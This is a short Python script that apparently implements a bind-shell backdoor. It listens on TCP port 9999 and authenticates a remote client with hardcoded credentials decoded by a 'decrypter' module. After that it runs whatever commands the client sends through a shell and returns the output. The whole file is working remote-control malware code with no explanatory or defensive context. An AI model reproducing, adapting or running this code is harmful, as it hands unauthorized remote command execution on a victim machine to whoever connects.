import socket
import subprocess
import sys
import threading
import decrypter
from time import sleep

clients = {}

def check_internet():
    ip = socket.gethostbyname(socket.gethostname())
    if ip == "127.0.0.1":
    	sys.exit(0)
    else:
        return ip


def authenticator(client_socket, addr, username, password):
	if (username == "MRX") and (password == "BHAI"):
		print("Client %s Authenticated" %addr[0])
		client_socket.send('Authenticated'.encode("utf-8"))
		return True
	else:
		print("Client %s Is Imposter" %addr[0])
		client_socket.send('Something Went Wrong!!'.encode("utf-8"))
		client_socket.close()
		return False

'''
def broadcast_command(all_client, command):
	for key in all_client.keys():
		cli_sock = all_client[key][0]
		cli_sock.send(command.encode('utf-8'))


'''
def execute_commands(client_socket, command):
	try:
		cmd_output = subprocess.check_output(command, shell=True)
		sleep(1)
		client_socket.send(cmd_output)
	except Exception as e:
		sleep(1)
		client_socket.send(str(e).encode('utf-8'))


def recv_commands(client_socket):
	try:
		while True:
			com = client_socket.recv(4096)
			command = com.decode("utf-8")
			sleep(1)
			execute_commands(client_socket, command)
	except:
		print("Closing Connection...")
		client_socket.close()
		server.close()



def client_checker(client_socket, addr):
	
	user_enc = (client_socket.recv(1024)).decode("utf-8")
	user_key = (client_socket.recv(1024)).decode("utf-8")
	pass_enc = (client_socket.recv(1024)).decode("utf-8")
	pass_key = (client_socket.recv(1024)).decode("utf-8")
	username = decrypter.text_deco(user_enc, user_key)
	password = decrypter.text_deco(pass_enc, pass_key)
	auth = authenticator(client_socket, addr, username, password)

	sleep(1)
	if auth == True:
		recv_commands(client_socket)




server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((check_internet(), 9999))
print("Server Started at %s:%d" %(check_internet(), 9999))
server.listen(1)
try:
	while True:
		client, addr = server.accept()
		c = threading.Thread(target=client_checker, args=(client, addr))
		print("Client Connected at %s:%d" %(addr[0], addr[1]))
		c.start()
		# client_checker(client, addr)

except:
	server.close()
	print("Server Closed ...")

